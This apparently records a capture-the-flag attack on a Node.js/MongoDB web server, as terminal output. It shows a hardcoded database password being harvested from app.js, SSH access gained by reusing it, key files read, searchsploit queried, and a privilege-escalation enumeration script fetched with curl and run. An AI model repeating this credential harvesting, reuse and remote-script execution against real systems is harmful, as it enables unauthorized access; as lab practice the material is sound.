+  inflating: var/www/myplace/node_modules/mongodb/lib/command_cursor.js  
+  inflating: var/www/myplace/node_modules/mongodb/lib/cursor.js  
+  inflating: var/www/myplace/node_modules/mongodb/lib/topology_base.js  
+  inflating: var/www/myplace/node_modules/mongodb/lib/mongo_client.js  
+  inflating: var/www/myplace/node_modules/mongodb/lib/authenticate.js  
+  inflating: var/www/myplace/node_modules/mongodb/yarn.lock  
+  inflating: var/www/myplace/node_modules/mongodb/.eslintrc  
+  inflating: var/www/myplace/node_modules/mongodb/package.json  
+  inflating: var/www/myplace/node_modules/mongodb/Makefile  
+  inflating: var/www/myplace/node_modules/mongodb/conf.json  
+ extracting: var/www/myplace/node_modules/mongodb/.coveralls.yml  
+  inflating: var/www/myplace/node_modules/mongodb/insert_bench.js  
+   creating: var/www/myplace/node_modules/path-to-regexp/
+  inflating: var/www/myplace/node_modules/path-to-regexp/History.md  
+  inflating: var/www/myplace/node_modules/path-to-regexp/Readme.md  
+  inflating: var/www/myplace/node_modules/path-to-regexp/index.js  
+  inflating: var/www/myplace/node_modules/path-to-regexp/LICENSE  
+  inflating: var/www/myplace/node_modules/path-to-regexp/package.json  
+   creating: var/www/myplace/node_modules/isarray/
+  inflating: var/www/myplace/node_modules/isarray/README.md  
+  inflating: var/www/myplace/node_modules/isarray/index.js  
+  inflating: var/www/myplace/node_modules/isarray/component.json  
+  inflating: var/www/myplace/node_modules/isarray/test.js  
+  inflating: var/www/myplace/node_modules/isarray/.travis.yml  
+  inflating: var/www/myplace/node_modules/isarray/package.json  
+  inflating: var/www/myplace/node_modules/isarray/Makefile  
+ extracting: var/www/myplace/node_modules/isarray/.npmignore  
+   creating: var/www/myplace/node_modules/process-nextick-args/
+  inflating: var/www/myplace/node_modules/process-nextick-args/index.js  
+  inflating: var/www/myplace/node_modules/process-nextick-args/license.md  
+  inflating: var/www/myplace/node_modules/process-nextick-args/test.js  
+  inflating: var/www/myplace/node_modules/process-nextick-args/.travis.yml  
+  inflating: var/www/myplace/node_modules/process-nextick-args/package.json  
+  inflating: var/www/myplace/node_modules/process-nextick-args/readme.md  
+   creating: var/www/myplace/node_modules/core-util-is/
+  inflating: var/www/myplace/node_modules/core-util-is/README.md  
+  inflating: var/www/myplace/node_modules/core-util-is/LICENSE  
+   creating: var/www/myplace/node_modules/core-util-is/lib/
+  inflating: var/www/myplace/node_modules/core-util-is/lib/util.js  
+  inflating: var/www/myplace/node_modules/core-util-is/test.js  
+  inflating: var/www/myplace/node_modules/core-util-is/package.json  
+  inflating: var/www/myplace/node_modules/core-util-is/float.patch  
+   creating: var/www/myplace/node_modules/body-parser/
+  inflating: var/www/myplace/node_modules/body-parser/README.md  
+  inflating: var/www/myplace/node_modules/body-parser/index.js  
+  inflating: var/www/myplace/node_modules/body-parser/LICENSE  
+  inflating: var/www/myplace/node_modules/body-parser/HISTORY.md  
+   creating: var/www/myplace/node_modules/body-parser/lib/
+  inflating: var/www/myplace/node_modules/body-parser/lib/read.js  
+   creating: var/www/myplace/node_modules/body-parser/lib/types/
+  inflating: var/www/myplace/node_modules/body-parser/lib/types/urlencoded.js  
+  inflating: var/www/myplace/node_modules/body-parser/lib/types/raw.js  
+  inflating: var/www/myplace/node_modules/body-parser/lib/types/json.js  
+  inflating: var/www/myplace/node_modules/body-parser/lib/types/text.js  
+  inflating: var/www/myplace/node_modules/body-parser/package.json  
+   creating: var/www/myplace/node_modules/on-finished/
+  inflating: var/www/myplace/node_modules/on-finished/README.md  
+  inflating: var/www/myplace/node_modules/on-finished/index.js  
+  inflating: var/www/myplace/node_modules/on-finished/LICENSE  
+  inflating: var/www/myplace/node_modules/on-finished/HISTORY.md  
+  inflating: var/www/myplace/node_modules/on-finished/package.json  
+   creating: var/www/myplace/node_modules/encodeurl/
+  inflating: var/www/myplace/node_modules/encodeurl/README.md  
+  inflating: var/www/myplace/node_modules/encodeurl/index.js  
+  inflating: var/www/myplace/node_modules/encodeurl/LICENSE  
+  inflating: var/www/myplace/node_modules/encodeurl/HISTORY.md  
+  inflating: var/www/myplace/node_modules/encodeurl/package.json  
+   creating: var/www/myplace/node_modules/type-is/
+  inflating: var/www/myplace/node_modules/type-is/README.md  
+  inflating: var/www/myplace/node_modules/type-is/index.js  
+  inflating: var/www/myplace/node_modules/type-is/LICENSE  
+  inflating: var/www/myplace/node_modules/type-is/HISTORY.md  
+  inflating: var/www/myplace/node_modules/type-is/package.json  
+   creating: var/www/myplace/node_modules/parseurl/
+  inflating: var/www/myplace/node_modules/parseurl/README.md  
+  inflating: var/www/myplace/node_modules/parseurl/index.js  
+  inflating: var/www/myplace/node_modules/parseurl/LICENSE  
+  inflating: var/www/myplace/node_modules/parseurl/HISTORY.md  
+  inflating: var/www/myplace/node_modules/parseurl/package.json  
+   creating: var/www/myplace/node_modules/resolve-from/
+  inflating: var/www/myplace/node_modules/resolve-from/index.js  
+  inflating: var/www/myplace/node_modules/resolve-from/package.json  
+  inflating: var/www/myplace/node_modules/resolve-from/readme.md  
+  inflating: var/www/myplace/node_modules/resolve-from/license  
+   creating: var/www/myplace/node_modules/forwarded/
+  inflating: var/www/myplace/node_modules/forwarded/README.md  
+  inflating: var/www/myplace/node_modules/forwarded/index.js  
+  inflating: var/www/myplace/node_modules/forwarded/LICENSE  
+  inflating: var/www/myplace/node_modules/forwarded/HISTORY.md  
+  inflating: var/www/myplace/node_modules/forwarded/package.json  
+   creating: var/www/myplace/node_modules/content-type/
+  inflating: var/www/myplace/node_modules/content-type/README.md  
+  inflating: var/www/myplace/node_modules/content-type/index.js  
+  inflating: var/www/myplace/node_modules/content-type/LICENSE  
+  inflating: var/www/myplace/node_modules/content-type/HISTORY.md  
+  inflating: var/www/myplace/node_modules/content-type/package.json  
+   creating: var/www/myplace/node_modules/random-bytes/
+  inflating: var/www/myplace/node_modules/random-bytes/README.md  
+  inflating: var/www/myplace/node_modules/random-bytes/index.js  
+  inflating: var/www/myplace/node_modules/random-bytes/LICENSE  
+  inflating: var/www/myplace/node_modules/random-bytes/HISTORY.md  
+  inflating: var/www/myplace/node_modules/random-bytes/package.json  
+   creating: var/www/myplace/node_modules/raw-body/
+  inflating: var/www/myplace/node_modules/raw-body/README.md  
+  inflating: var/www/myplace/node_modules/raw-body/index.js  
+  inflating: var/www/myplace/node_modules/raw-body/LICENSE  
+  inflating: var/www/myplace/node_modules/raw-body/HISTORY.md  
+  inflating: var/www/myplace/node_modules/raw-body/package.json  
+   creating: var/www/myplace/node_modules/crc/
+  inflating: var/www/myplace/node_modules/crc/README.md  
+  inflating: var/www/myplace/node_modules/crc/LICENSE  
+   creating: var/www/myplace/node_modules/crc/lib/
+  inflating: var/www/myplace/node_modules/crc/lib/index.js  
+  inflating: var/www/myplace/node_modules/crc/lib/crc8_1wire.js  
+  inflating: var/www/myplace/node_modules/crc/lib/crc16_ccitt.js  
+  inflating: var/www/myplace/node_modules/crc/lib/crc16_kermit.js  
+  inflating: var/www/myplace/node_modules/crc/lib/crc1.js  
+  inflating: var/www/myplace/node_modules/crc/lib/crc16_modbus.js  
+  inflating: var/www/myplace/node_modules/crc/lib/crc24.js  
+  inflating: var/www/myplace/node_modules/crc/lib/crc8.js  
+  inflating: var/www/myplace/node_modules/crc/lib/create_buffer.js  
+  inflating: var/www/myplace/node_modules/crc/lib/crc16.js  
+  inflating: var/www/myplace/node_modules/crc/lib/crc16_xmodem.js  
+  inflating: var/www/myplace/node_modules/crc/lib/define_crc.js  
+  inflating: var/www/myplace/node_modules/crc/lib/crc32.js  
+  inflating: var/www/myplace/node_modules/crc/package.json  
+   creating: var/www/myplace/node_modules/accepts/
+  inflating: var/www/myplace/node_modules/accepts/README.md  
+  inflating: var/www/myplace/node_modules/accepts/index.js  
+  inflating: var/www/myplace/node_modules/accepts/LICENSE  
+  inflating: var/www/myplace/node_modules/accepts/HISTORY.md  
+  inflating: var/www/myplace/node_modules/accepts/package.json  
+   creating: var/www/myplace/node_modules/fresh/
+  inflating: var/www/myplace/node_modules/fresh/README.md  
+  inflating: var/www/myplace/node_modules/fresh/index.js  
+  inflating: var/www/myplace/node_modules/fresh/LICENSE  
+  inflating: var/www/myplace/node_modules/fresh/HISTORY.md  
+  inflating: var/www/myplace/node_modules/fresh/package.json  
+   creating: var/www/myplace/node_modules/mime-db/
+  inflating: var/www/myplace/node_modules/mime-db/README.md  
+  inflating: var/www/myplace/node_modules/mime-db/index.js  
+  inflating: var/www/myplace/node_modules/mime-db/LICENSE  
+  inflating: var/www/myplace/node_modules/mime-db/HISTORY.md  
+  inflating: var/www/myplace/node_modules/mime-db/package.json  
+  inflating: var/www/myplace/node_modules/mime-db/db.json  
+   creating: var/www/myplace/node_modules/setprototypeof/
+  inflating: var/www/myplace/node_modules/setprototypeof/README.md  
+  inflating: var/www/myplace/node_modules/setprototypeof/index.js  
+  inflating: var/www/myplace/node_modules/setprototypeof/LICENSE  
+  inflating: var/www/myplace/node_modules/setprototypeof/package.json  
+   creating: var/www/myplace/node_modules/mongodb-core/
+  inflating: var/www/myplace/node_modules/mongodb-core/THIRD-PARTY-NOTICES  
+  inflating: var/www/myplace/node_modules/mongodb-core/README.md  
+  inflating: var/www/myplace/node_modules/mongodb-core/index.js  
+  inflating: var/www/myplace/node_modules/mongodb-core/LICENSE  
+  inflating: var/www/myplace/node_modules/mongodb-core/HISTORY.md  
+   creating: var/www/myplace/node_modules/mongodb-core/lib/
+   creating: var/www/myplace/node_modules/mongodb-core/lib/tools/
+  inflating: var/www/myplace/node_modules/mongodb-core/lib/tools/smoke_plugin.js  
+   creating: var/www/myplace/node_modules/mongodb-core/lib/auth/
+  inflating: var/www/myplace/node_modules/mongodb-core/lib/auth/gssapi.js  
+  inflating: var/www/myplace/node_modules/mongodb-core/lib/auth/mongocr.js  
+  inflating: var/www/myplace/node_modules/mongodb-core/lib/auth/sspi.js  
+  inflating: var/www/myplace/node_modules/mongodb-core/lib/auth/plain.js  
+  inflating: var/www/myplace/node_modules/mongodb-core/lib/auth/scram.js  
+  inflating: var/www/myplace/node_modules/mongodb-core/lib/auth/x509.js  
+   creating: var/www/myplace/node_modules/mongodb-core/lib/wireprotocol/
+  inflating: var/www/myplace/node_modules/mongodb-core/lib/wireprotocol/shared.js  
+  inflating: var/www/myplace/node_modules/mongodb-core/lib/wireprotocol/3_2_support.js  
+  inflating: var/www/myplace/node_modules/mongodb-core/lib/wireprotocol/commands.js  
+  inflating: var/www/myplace/node_modules/mongodb-core/lib/wireprotocol/2_4_support.js  
+  inflating: var/www/myplace/node_modules/mongodb-core/lib/wireprotocol/2_6_support.js  
+   creating: var/www/myplace/node_modules/mongodb-core/lib/topologies/
+  inflating: var/www/myplace/node_modules/mongodb-core/lib/topologies/server.js  
+  inflating: var/www/myplace/node_modules/mongodb-core/lib/topologies/shared.js  
+  inflating: var/www/myplace/node_modules/mongodb-core/lib/topologies/replset.js  
+  inflating: var/www/myplace/node_modules/mongodb-core/lib/topologies/read_preference.js  
+  inflating: var/www/myplace/node_modules/mongodb-core/lib/topologies/mongos.js  
+  inflating: var/www/myplace/node_modules/mongodb-core/lib/topologies/replset_state.js  
+  inflating: var/www/myplace/node_modules/mongodb-core/lib/utils.js  
+  inflating: var/www/myplace/node_modules/mongodb-core/lib/cursor.js  
+  inflating: var/www/myplace/node_modules/mongodb-core/lib/error.js  
+   creating: var/www/myplace/node_modules/mongodb-core/lib/connection/
+  inflating: var/www/myplace/node_modules/mongodb-core/lib/connection/logger.js  
+  inflating: var/www/myplace/node_modules/mongodb-core/lib/connection/commands.js  
+  inflating: var/www/myplace/node_modules/mongodb-core/lib/connection/command_result.js  
+  inflating: var/www/myplace/node_modules/mongodb-core/lib/connection/utils.js  
+  inflating: var/www/myplace/node_modules/mongodb-core/lib/connection/connection.js  
+  inflating: var/www/myplace/node_modules/mongodb-core/lib/connection/pool.js  
+  inflating: var/www/myplace/node_modules/mongodb-core/.eslintrc  
+  inflating: var/www/myplace/node_modules/mongodb-core/test1.js  
+  inflating: var/www/myplace/node_modules/mongodb-core/test.js  
+  inflating: var/www/myplace/node_modules/mongodb-core/package.json  
+  inflating: var/www/myplace/node_modules/mongodb-core/Makefile  
+  inflating: var/www/myplace/node_modules/mongodb-core/conf.json  
+ extracting: var/www/myplace/node_modules/mongodb-core/.coveralls.yml  
+  inflating: var/www/myplace/node_modules/mongodb-core/TESTING.md  
+   creating: var/www/myplace/node_modules/http-errors/
+  inflating: var/www/myplace/node_modules/http-errors/README.md  
+  inflating: var/www/myplace/node_modules/http-errors/index.js  
+  inflating: var/www/myplace/node_modules/http-errors/LICENSE  
+  inflating: var/www/myplace/node_modules/http-errors/HISTORY.md  
+  inflating: var/www/myplace/node_modules/http-errors/package.json  
+  inflating: var/www/myplace/package.json  
+  inflating: var/www/myplace/app.js  
+   creating: var/www/myplace/static/
+   creating: var/www/myplace/static/uploads/
+  inflating: var/www/myplace/static/uploads/mark.jpg  
+  inflating: var/www/myplace/static/uploads/myP14ceAdm1nAcc0uNT.jpg  
+  inflating: var/www/myplace/static/uploads/tom.jpg  
+  inflating: var/www/myplace/static/uploads/rastating.jpg  
+   creating: var/www/myplace/static/vendor/
+   creating: var/www/myplace/static/vendor/font-awesome/
+   creating: var/www/myplace/static/vendor/font-awesome/scss/
+  inflating: var/www/myplace/static/vendor/font-awesome/scss/_rotated-flipped.scss  
+  inflating: var/www/myplace/static/vendor/font-awesome/scss/_screen-reader.scss  
+  inflating: var/www/myplace/static/vendor/font-awesome/scss/_mixins.scss  
+  inflating: var/www/myplace/static/vendor/font-awesome/scss/font-awesome.scss  
+  inflating: var/www/myplace/static/vendor/font-awesome/scss/_fixed-width.scss  
+  inflating: var/www/myplace/static/vendor/font-awesome/scss/_larger.scss  
+  inflating: var/www/myplace/static/vendor/font-awesome/scss/_bordered-pulled.scss  
+  inflating: var/www/myplace/static/vendor/font-awesome/scss/_list.scss  
+  inflating: var/www/myplace/static/vendor/font-awesome/scss/_variables.scss  
+  inflating: var/www/myplace/static/vendor/font-awesome/scss/_core.scss  
+  inflating: var/www/myplace/static/vendor/font-awesome/scss/_animated.scss  
+  inflating: var/www/myplace/static/vendor/font-awesome/scss/_path.scss  
+  inflating: var/www/myplace/static/vendor/font-awesome/scss/_stacked.scss  
+  inflating: var/www/myplace/static/vendor/font-awesome/scss/_icons.scss  
+   creating: var/www/myplace/static/vendor/font-awesome/css/
+  inflating: var/www/myplace/static/vendor/font-awesome/css/font-awesome.min.css  
+  inflating: var/www/myplace/static/vendor/font-awesome/css/font-awesome.css  
+   creating: var/www/myplace/static/vendor/font-awesome/fonts/
+  inflating: var/www/myplace/static/vendor/font-awesome/fonts/fontawesome-webfont.eot  
+  inflating: var/www/myplace/static/vendor/font-awesome/fonts/FontAwesome.otf  
+  inflating: var/www/myplace/static/vendor/font-awesome/fonts/fontawesome-webfont.woff  
+  inflating: var/www/myplace/static/vendor/font-awesome/fonts/fontawesome-webfont.ttf  
+  inflating: var/www/myplace/static/vendor/font-awesome/fonts/fontawesome-webfont.woff2  
+  inflating: var/www/myplace/static/vendor/font-awesome/fonts/fontawesome-webfont.svg  
+   creating: var/www/myplace/static/vendor/font-awesome/less/
+  inflating: var/www/myplace/static/vendor/font-awesome/less/bordered-pulled.less  
+  inflating: var/www/myplace/static/vendor/font-awesome/less/screen-reader.less  
+  inflating: var/www/myplace/static/vendor/font-awesome/less/core.less  
+  inflating: var/www/myplace/static/vendor/font-awesome/less/rotated-flipped.less  
+  inflating: var/www/myplace/static/vendor/font-awesome/less/variables.less  
+  inflating: var/www/myplace/static/vendor/font-awesome/less/larger.less  
+  inflating: var/www/myplace/static/vendor/font-awesome/less/path.less  
+  inflating: var/www/myplace/static/vendor/font-awesome/less/list.less  
+  inflating: var/www/myplace/static/vendor/font-awesome/less/fixed-width.less  
+  inflating: var/www/myplace/static/vendor/font-awesome/less/icons.less  
+  inflating: var/www/myplace/static/vendor/font-awesome/less/mixins.less  
+  inflating: var/www/myplace/static/vendor/font-awesome/less/animated.less  
+  inflating: var/www/myplace/static/vendor/font-awesome/less/stacked.less  
+  inflating: var/www/myplace/static/vendor/font-awesome/less/font-awesome.less  
+   creating: var/www/myplace/static/vendor/jquery/
+  inflating: var/www/myplace/static/vendor/jquery/jquery.min.js  
+  inflating: var/www/myplace/static/vendor/jquery/jquery.js  
+   creating: var/www/myplace/static/vendor/angular/
+  inflating: var/www/myplace/static/vendor/angular/angular-route.min.js  
+  inflating: var/www/myplace/static/vendor/angular/angular.min.js  
+   creating: var/www/myplace/static/vendor/bootstrap/
+   creating: var/www/myplace/static/vendor/bootstrap/css/
+  inflating: var/www/myplace/static/vendor/bootstrap/css/bootstrap.min.css  
+  inflating: var/www/myplace/static/vendor/bootstrap/css/bootstrap.css  
+   creating: var/www/myplace/static/vendor/bootstrap/fonts/
+  inflating: var/www/myplace/static/vendor/bootstrap/fonts/glyphicons-halflings-regular.eot  
+  inflating: var/www/myplace/static/vendor/bootstrap/fonts/glyphicons-halflings-regular.svg  
+  inflating: var/www/myplace/static/vendor/bootstrap/fonts/glyphicons-halflings-regular.ttf  
+  inflating: var/www/myplace/static/vendor/bootstrap/fonts/glyphicons-halflings-regular.woff  
+  inflating: var/www/myplace/static/vendor/bootstrap/fonts/glyphicons-halflings-regular.woff2  
+   creating: var/www/myplace/static/vendor/bootstrap/js/
+  inflating: var/www/myplace/static/vendor/bootstrap/js/bootstrap.min.js  
+  inflating: var/www/myplace/static/vendor/bootstrap/js/bootstrap.js  
+   creating: var/www/myplace/static/assets/
+   creating: var/www/myplace/static/assets/css/
+  inflating: var/www/myplace/static/assets/css/freelancer.css  
+  inflating: var/www/myplace/static/assets/css/app.css  
+  inflating: var/www/myplace/static/assets/css/freelancer.min.css  
+   creating: var/www/myplace/static/assets/js/
+   creating: var/www/myplace/static/assets/js/misc/
+  inflating: var/www/myplace/static/assets/js/misc/freelancer.min.js  
+   creating: var/www/myplace/static/assets/js/app/
+  inflating: var/www/myplace/static/assets/js/app/app.js  
+   creating: var/www/myplace/static/assets/js/app/controllers/
+  inflating: var/www/myplace/static/assets/js/app/controllers/admin.js  
+  inflating: var/www/myplace/static/assets/js/app/controllers/profile.js  
+  inflating: var/www/myplace/static/assets/js/app/controllers/login.js  
+  inflating: var/www/myplace/static/assets/js/app/controllers/home.js  
+   creating: var/www/myplace/static/partials/
+  inflating: var/www/myplace/static/partials/admin.html  
+  inflating: var/www/myplace/static/partials/login.html  
+  inflating: var/www/myplace/static/partials/home.html  
+  inflating: var/www/myplace/static/partials/profile.html  
+  inflating: var/www/myplace/app.html  
+cdowns@7242-alpha-reticuli:~/Downloads|
+⇒  
+
+Hunting the Directory --
+
+cdowns@7242-alpha-reticuli:~/Downloads|
+⇒  grep -r -i "backup" var/* 
+var/www/myplace/static/vendor/jquery/jquery.js:				contextBackup = outermostContext,
+var/www/myplace/static/vendor/jquery/jquery.js:				dirrunsUnique = (dirruns += contextBackup == null ? 1 : Math.random() || 0.1),
+var/www/myplace/static/vendor/jquery/jquery.js:				outermostContext = contextBackup;
+var/www/myplace/static/assets/js/app/controllers/admin.js:  $scope.backup = function () {
+var/www/myplace/static/assets/js/app/controllers/admin.js:    $window.open('/api/admin/backup', '_self');
+var/www/myplace/static/partials/admin.html:          <button class="btn btn-large btn-primary" ng-click="backup()">Download Backup</button>
+var/www/myplace/app.js:const backup_key  = '45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474';
+var/www/myplace/app.js:  app.get('/api/admin/backup', function (req, res) {
+var/www/myplace/app.js:      var proc = spawn('/usr/local/bin/backup', ['-q', backup_key, __dirname ]);
+var/www/myplace/app.js:      var backup = '';
+var/www/myplace/app.js:        res.header("Content-Disposition", "attachment; filename=myplace.backup");
+var/www/myplace/app.js:        res.send(backup);
+var/www/myplace/app.js:        backup += chunk;
+cdowns@7242-alpha-reticuli:~/Downloads|
+⇒  cat var/www/myplace/app.js | grep const
+const express     = require('express');
+const session     = require('express-session');
+const bodyParser  = require('body-parser');
+const crypto      = require('crypto');
+const MongoClient = require('mongodb').MongoClient;
+const ObjectID    = require('mongodb').ObjectID;
+const path        = require("path");
+const spawn        = require('child_process').spawn;
+const app         = express();
+const url         = 'mongodb://mark:5AYRft73VtFpc84k@localhost:27017/myplace?authMechanism=DEFAULT&authSource=myplace';
+const backup_key  = '45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474';
+cdowns@7242-alpha-reticuli:~/Downloads|
+⇒  
+
+Trying --
+mark:5AYRft73VtFpc84k
+
+⇒  ssh -p 22 mark@node1
+mark@node1's password: 
+Permission denied, please try again.
+mark@node1's password: 
+
+The programs included with the Ubuntu system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
+applicable law.
+
+
+
+              .-. 
+        .-'``(|||) 
+     ,`\ \    `-`.                 88                         88 
+    /   \ '``-.   `                88                         88 
+  .-.  ,       `___:      88   88  88,888,  88   88  ,88888, 88888  88   88 
+ (:::) :        ___       88   88  88   88  88   88  88   88  88    88   88 
+  `-`  `       ,   :      88   88  88   88  88   88  88   88  88    88   88 
+    \   / ,..-`   ,       88   88  88   88  88   88  88   88  88    88   88 
+     `./ /    .-.`        '88888'  '88888'  '88888'  88   88  '8888 '88888' 
+        `-..-(   ) 
+              `-` 
+
+
+
+
+The programs included with the Ubuntu system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
+applicable law.
+
+Last login: Mon Aug  6 23:32:28 2018 from 10.2.1.1
+mark@node:~$ mark@node:~$ mongodump 
+2018-08-14T04:03:53.829+0100	Failed: error getting database names: not authorized on admin to execute command { listDatabases: 1 }
+mark@node:~$ mongod
+mongod     mongodump  
+mark@node:~$ mongod -v
+2018-08-14T04:04:15.163+0100 I CONTROL  [initandlisten] MongoDB starting : pid=2201 port=27017 dbpath=/data/db 64-bit host=node
+2018-08-14T04:04:15.163+0100 I CONTROL  [initandlisten] db version v3.2.16
+2018-08-14T04:04:15.164+0100 I CONTROL  [initandlisten] git version: 056bf45128114e44c5358c7a8776fb582363e094
+2018-08-14T04:04:15.164+0100 I CONTROL  [initandlisten] OpenSSL version: OpenSSL 1.0.2g  1 Mar 2016
+2018-08-14T04:04:15.164+0100 I CONTROL  [initandlisten] allocator: tcmalloc
+2018-08-14T04:04:15.165+0100 I CONTROL  [initandlisten] modules: none
+2018-08-14T04:04:15.165+0100 I CONTROL  [initandlisten] build environment:
+2018-08-14T04:04:15.165+0100 I CONTROL  [initandlisten]     distmod: ubuntu1604
+2018-08-14T04:04:15.165+0100 I CONTROL  [initandlisten]     distarch: x86_64
+2018-08-14T04:04:15.166+0100 I CONTROL  [initandlisten]     target_arch: x86_64
+2018-08-14T04:04:15.166+0100 I CONTROL  [initandlisten] options: { systemLog: { verbosity: 1 } }
+2018-08-14T04:04:15.166+0100 D NETWORK  [initandlisten] fd limit hard:1048576 soft:1024 max conn: 819
+2018-08-14T04:04:15.189+0100 E NETWORK  [initandlisten] listen(): bind() failed errno:98 Address already in use for socket: 0.0.0.0:27017
+2018-08-14T04:04:15.189+0100 E NETWORK  [initandlisten]   addr already in use
+2018-08-14T04:04:15.189+0100 E STORAGE  [initandlisten] Failed to set up sockets during startup.
+2018-08-14T04:04:15.189+0100 I CONTROL  [initandlisten] dbexit:  rc: 48
+mark@node:~$ cd /etc/m
+mdadm/          modprobe.d/     modules-load.d/ myplace/        
+mark@node:~$ cd /etc/myplace/
+mark@node:/etc/myplace$ ls
+keys
+mark@node:/etc/myplace$ cat keys 
+a01a6aa5aaf1d7729f35c8278daae30f8a988257144c003f8b12c5aec39bc508
+45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474
+3de811f4ab2b7543eaf45df611c2dd2541a5fc5af601772638b81dce6852d110
+
+mark@node:/etc/myplace$ 
+
+cdowns@7242-alpha-reticuli:/var/www/html|
+⇒  searchsploit mongodb
+------------------------------------------------------------------------------------------------------------------------------------------------------ ----------------------------------------
+ Exploit Title                                                                                                                                        |  Path
+                                                                                                                                                      | (/usr/share/exploitdb/)
+------------------------------------------------------------------------------------------------------------------------------------------------------ ----------------------------------------
+MongoDB 2.2.3 - nativeHelper.apply Remote Code Execution                                                                                              | exploits/linux/remote/24947.txt
+MongoDB - 'conn' Mongo Object Remote Code Execution                                                                                                   | exploits/multiple/remote/38669.txt
+MongoDB - nativeHelper.apply Remote Code Execution (Metasploit)                                                                                       | exploits/linux/remote/24935.rb
+PHPmongoDB 1.0.0 - Multiple Vulnerabilities                                                                                                           | exploits/php/webapps/39697.txt
+RockMongo PHP MongoDB Administrator 1.1.8 - Multiple Vulnerabilities                                                                                  | exploits/php/webapps/39682.txt
+------------------------------------------------------------------------------------------------------------------------------------------------------ ----------------------------------------
+Shellcodes: No Result
+Papers: No Result
+cdowns@7242-alpha-reticuli:/var/www/html|
+⇒  
+
+Junk --
+
+mark@node:/tmp$ curl -sk -O  https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
+mark@node:/tmp$ bash LinEnum.sh 
+
+#########################################################
+# Local Linux Enumeration & Privilege Escalation Script #
+#########################################################
+# www.rebootuser.com
+# version 0.91
+
+[-] Debug Info
+[+] Thorough tests = Disabled (SUID/GUID checks will not be perfomed!)
+
+
+Scan started at:
+Tue Aug 14 04:11:01 BST 2018
+
+
+### SYSTEM ##############################################
+[-] Kernel information:
+Linux node 4.4.0-93-generic #116-Ubuntu SMP Fri Aug 11 21:17:51 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux
+
+
+[-] Kernel information (continued):
+Linux version 4.4.0-93-generic (buildd@lgw01-03) (gcc version 5.4.0 20160609 (Ubuntu 5.4.0-6ubuntu1~16.04.4) ) #116-Ubuntu SMP Fri Aug 11 21:17:51 UTC 2017
+
+
+[-] Specific release information:
+DISTRIB_ID=Ubuntu
+DISTRIB_RELEASE=16.04
+DISTRIB_CODENAME=xenial
+DISTRIB_DESCRIPTION="Ubuntu 16.04.3 LTS"
+NAME="Ubuntu"
+VERSION="16.04.3 LTS (Xenial Xerus)"
+ID=ubuntu
+ID_LIKE=debian
+PRETTY_NAME="Ubuntu 16.04.3 LTS"
+VERSION_ID="16.04"
+HOME_URL="http://www.ubuntu.com/"
+SUPPORT_URL="http://help.ubuntu.com/"
+BUG_REPORT_URL="http://bugs.launchpad.net/ubuntu/"
+VERSION_CODENAME=xenial
+UBUNTU_CODENAME=xenial
+
+
+[-] Hostname:
+node
+
+
+### USER/GROUP ##########################################
+[-] Current user/group info:
+uid=1001(mark) gid=1001(mark) groups=1001(mark)
+
+
+[-] Users that have previously logged onto the system:
+Username         Port     From             Latest
+root             tty1                      Mon Aug  6 23:08:07 +0100 2018
+tom              tty1                      Mon Aug  6 22:58:43 +0100 2018
+mark             pts/1    192.168.0.2      Tue Aug 14 03:57:06 +0100 2018
+
+
+[-] Who else is logged on:
+ 04:11:01 up  1:27,  2 users,  load average: 0.00, 0.00, 0.00
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+mark     pts/0    192.168.0.2      03:16    5.00s  0.43s  0.00s bash LinEnum.sh
+mark     pts/1    192.168.0.2      03:57    3:30   0.14s  0.14s -bash
+
+
+[-] Group memberships:
+uid=0(root) gid=0(root) groups=0(root),1002(admin)
+uid=1(daemon) gid=1(daemon) groups=1(daemon)
+uid=2(bin) gid=2(bin) groups=2(bin)
+uid=3(sys) gid=3(sys) groups=3(sys)
+uid=4(sync) gid=65534(nogroup) groups=65534(nogroup)
+uid=5(games) gid=60(games) groups=60(games)
+uid=6(man) gid=12(man) groups=12(man)
+uid=7(lp) gid=7(lp) groups=7(lp)
+uid=8(mail) gid=8(mail) groups=8(mail)
+uid=9(news) gid=9(news) groups=9(news)
+uid=10(uucp) gid=10(uucp) groups=10(uucp)
+uid=13(proxy) gid=13(proxy) groups=13(proxy)
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+uid=34(backup) gid=34(backup) groups=34(backup)
+uid=38(list) gid=38(list) groups=38(list)
+uid=39(irc) gid=39(irc) groups=39(irc)
+uid=41(gnats) gid=41(gnats) groups=41(gnats)
+uid=65534(nobody) gid=65534(nogroup) groups=65534(nogroup)
+uid=100(systemd-timesync) gid=102(systemd-timesync) groups=102(systemd-timesync)
+uid=101(systemd-network) gid=103(systemd-network) groups=103(systemd-network)
+uid=102(systemd-resolve) gid=104(systemd-resolve) groups=104(systemd-resolve)
+uid=103(systemd-bus-proxy) gid=105(systemd-bus-proxy) groups=105(systemd-bus-proxy)
+uid=104(syslog) gid=108(syslog) groups=108(syslog),4(adm)
+uid=105(_apt) gid=65534(nogroup) groups=65534(nogroup)
+uid=106(lxd) gid=65534(nogroup) groups=65534(nogroup)
+uid=107(messagebus) gid=111(messagebus) groups=111(messagebus)
+uid=108(uuidd) gid=112(uuidd) groups=112(uuidd)
+uid=109(dnsmasq) gid=65534(nogroup) groups=65534(nogroup)
+uid=110(sshd) gid=65534(nogroup) groups=65534(nogroup)
+uid=1000(tom) gid=1000(tom) groups=1000(tom),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare),1002(admin)
+uid=111(mongodb) gid=65534(nogroup) groups=65534(nogroup),117(mongodb)
+uid=1001(mark) gid=1001(mark) groups=1001(mark)
+
+
+[-] It looks like we have some admin users:
+uid=104(syslog) gid=108(syslog) groups=108(syslog),4(adm)
